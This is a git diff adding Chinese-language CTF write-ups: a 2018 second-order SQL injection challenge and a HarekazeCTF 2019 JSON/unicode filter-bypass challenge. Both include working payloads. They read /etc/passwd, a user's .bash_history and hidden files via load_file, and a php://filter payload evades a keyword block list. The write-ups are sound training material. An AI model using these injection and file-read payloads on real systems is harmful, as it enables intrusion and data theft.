@@ -4051,7 +4051,8 @@ url解码之后就是 `?code=phpinfo();`
     将得到的结果输入即可返回flag
 
 ## SQLi-二次注入
-### RCTF2015-EasySQL(二次注入报错注入)
+
+### RCTF2015-EasySQL(二次注入+报错注入)
 
 **注册页面写入payload，在修改密码界面输出结果**
 
@@ -4164,6 +4165,148 @@ url解码之后就是 `?code=phpinfo();`
         $msg = "信息不全";
     }
     ```
+
+###  网鼎杯2018 comment
+
+*知识点*
+-------
+
+- git泄露
+- 二次注入
+- SQL文件读取
+- 特殊文件识别利用
+
+**过程**
+--------
+1. dirsearch 扫面网站目录，发现git泄露
+2. 尝试发帖的时候，跳转到登录页，账号密码输入框里有提示，就用bp爆破了一下密码，得到密码后三位是666
+3. GitHack获取后端源码，下完后发现源码很少，这种情况就是源码不全
+
+    `git log`一下，发现是空的，只有自己下载的那个记录。
+
+    `git log --reflog`发现几个提交，看wp说console处也有提示
+    >程序员GIT写一半跑路了,都没来得及Commit :)
+
+    >git log --reflog 查看所有分支的所有操作记录（包括已经被删除的commit记录和reset的操作）
+
+    `git reset --hard commit记录` 还原源码
+
+    ```php
+    <?php
+    include "mysql.php";
+    session_start();
+    if($_SESSION['login'] != 'yes'){
+        header("Location: ./login.php");
+        die();
+    }
+    if(isset($_GET['do'])){
+    switch ($_GET['do'])
+    {
+    case 'write':
+        $category = addslashes($_POST['category']);
+        $title = addslashes($_POST['title']);
+        $content = addslashes($_POST['content']);
+        $sql = "insert into board
+                set category = '$category',
+                    title = '$title',
+                    content = '$content'";
+        $result = mysql_query($sql);
+        header("Location: ./index.php");
+        break;
+    case 'comment':
+        $bo_id = addslashes($_POST['bo_id']);
+        $sql = "select category from board where id='$bo_id'";
+        $result = mysql_query($sql);
+        $num = mysql_num_rows($result);
+        if($num>0){
+        $category = mysql_fetch_array($result)['category'];
+        $content = addslashes($_POST['content']);
+        $sql = "insert into comment
+                set category = '$category',
+                    content = '$content',
+                    bo_id = '$bo_id'";
+        $result = mysql_query($sql);
+        }
+        header("Location: ./comment.php?id=$bo_id");
+        break;
+    default:
+        header("Location: ./index.php");
+    }
+    }
+    else{
+        header("Location: ./index.php");
+    }
+    ?>
+    ```
+4. SQL注入
+
+    addslashes()函数，这个函数会把特殊的字符转义。就是在特殊字符前加一个`\`，想到之前做的一道题[CISCN2019-easyweb](#ciscn2019-总决赛day2-web1easyweb),利用加的`\`来注释后面的一个单引号，但是这道题不是这样做的
+    >数据库会自动清除反斜杠
+
+    所以如果`addslashes()`处理的值往数据库里走一圈，相当于没处理。
+
+    ```php
+    $category = mysql_fetch_array($result)['category'];
+    ```
+    catefory 从数据库中取值，漏洞在这
+
+    但是注意，这道题目代码中换行写sql语句，那么写入数据库的sql语句也是有换行的，所以单纯用`#`注释sql语句就不行了。这时要`#`和`/**/`(多行注释)结合起来
+
+    第一次write时
+    ```url
+    title=1&category=1'content=user(),/*&content=aaa
+    ```
+    第二次评论时
+    ```hurl
+    content=*/#&bo_id=1
+    ```
+    最终会形成
+    ```mysql
+    insert into comment
+        set category = '1',content=user(),/*',
+            content = '*/#',
+            bo_id = '$bo_id'
+    ```
+    第二行的/*与第三行的*/遥相呼应，将中间的给注释了，而第三行的#，将后面的单引号和逗号给注释了。
+
+    第四行还有一句不能忽略，所以那个逗号也需要加。
+
+    write加上comment就完成了一次完成的sql注入，write时`content=user()`部分的`user()`可以换成sql查询语句，从而可以进行数据库字段爆破。当爆破出来列以后会发现没有flag相关信息。
+
+    看wp上说，user()那有提示`root@localhost`
+    >说明flag不在数据库而在本地文件里，需要读取。在数据库中无需root权限。
+
+    读/etc/passwd,发现www用户信息
+    >一般设置web的都是www用户，所以找www。
+    >找到www用户目录/home/www/
+
+    读www用户历史命令
+
+    ```url
+    1',content=(select load_file('/home/www/.bash_history')),/*
+    ```
+    发现了一些文件操作信息
+    ```bash
+    cd /tmp/
+    unzip html.zip
+    rm -f html.zip
+    cp -r html /var/www/
+    cd /var/www/html/
+    rm -f .DS_Store
+    service apache2 start
+    ```
+    删除了`/var/www/html/.DS_Store`
+
+    但是没删`/tmp/html/.DS_Store`
+    >.DS_Store是Mac OS保存文件夹的自定义属性的隐藏文件，如文件的图标位置或背景色，相当于Windows的desktop.ini。经常会有一些不可见的字符
+
+    读取.DS_Store文件
+    ```url
+    1',content=(select hex(load_file('/tmp/html/.DS_Store'))),/*
+    ```
+    16进制解码得到存放flag的文件，上面的payload更换文件名，读取解码得到flag
+
+    *读DS_Store时，不用hex转码的话会因为乱码导致读不全，读flag时不用hex转码也读不出来*
 
 ## 无列名注入
 ### 前言
@@ -4685,3 +4828,72 @@ for i in item:
     ```
 
     这样操作会发现并没有真正的flag。根目录和项目目录下的flag都是假的，看了wp才知道flag放在phpinfo中，和之前遇到的某一到题目一样，flag都是在phpinfo()中。
+
+## [HarekazeCTF2019]encode_and_encode
+
+**知识点**
+----------
+- JSON基础
+- php伪协议
+
+1. 点击初始页面的`Source Code`链接会跳转`query.php`并显示源码。
+
+    ```php
+     <?php
+    error_reporting(0);
+
+    if (isset($_GET['source'])) {
+    show_source(__FILE__);
+    exit();
+    }
+
+    function is_valid($str) {
+    $banword = [
+        // no path traversal
+        '\.\.',
+        // no stream wrapper
+        '(php|file|glob|data|tp|zip|zlib|phar):',
+        // no data exfiltration
+        'flag'
+    ];
+    $regexp = '/' . implode('|', $banword) . '/i';
+    if (preg_match($regexp, $str)) {
+        return false;
+    }
+    return true;
+    }
+
+    $body = file_get_contents('php://input');
+    $json = json_decode($body, true);
+
+    if (is_valid($body) && isset($json) && isset($json['page'])) {
+    $page = $json['page'];
+    $content = file_get_contents($page);
+    if (!$content || !is_valid($content)) {
+        $content = "<p>not found</p>\n";
+    }
+    } else {
+    $content = '<p>invalid request</p>';
+    }
+
+    // no data exfiltration!!!
+    $content = preg_replace('/HarekazeCTF\{.+\}/i', 'HarekazeCTF{&lt;censored&gt;}', $content);
+    echo json_encode(['content' => $content]); 
+    ```
+
+    简单来说就是根据我们传入的POST数据作为json解析去读取文件，但是过滤了相关关键字，并对结果也进行过滤。
+
+    >php的json_decode在遇到unicode编码时会自动把它转换成正常的字符
+    >json解析时的关键字过滤可以采用unicode编码，json是支持用unicode编码直接表示对应字符的，如下两个写法是等价的。
+    ```json
+    {"poc":"php"}
+    {"poc":"\u0070\u0068\u0070"}
+    ```
+
+    至于结果的过滤，采用php伪协议的filter进行下base64编码就能绕过。
+
+    payload：
+    ```php
+    {"page":"\u0070\u0068\u0070://filter/convert.base64-encode/resource=/\u0066\u006c\u0061\u0067"}
+    ```
+    *关键字也可以不用全部替换成unicode编码，替换其中一个字符也可以*
